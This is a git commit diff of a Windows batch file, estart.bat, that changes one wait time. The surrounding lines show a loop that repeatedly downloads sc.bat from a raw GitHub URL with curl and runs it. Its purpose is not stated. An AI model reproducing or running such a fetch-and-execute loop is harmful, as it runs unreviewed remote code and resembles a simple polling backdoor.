4a097ea99c558be406db3500816a5a03671ee342
SeduHome <125974063+SeduHome@users.noreply.github.com>
2024-03-25 09:52:37 +0100

    Update estart.bat

--- Beruf/estart.bat
+++ Beruf/estart.bat
@@ -4,5 +4,5 @@ del sc.bat
 curl https://raw.githubusercontent.com/SeduHome/Test/main/sc.bat>sc.bat
 timeout /t 1 /nobreak >nul
 start sc.bat
-timeout /t 3 /nobreak >nul
+timeout /t 8 /nobreak >nul
 goto a
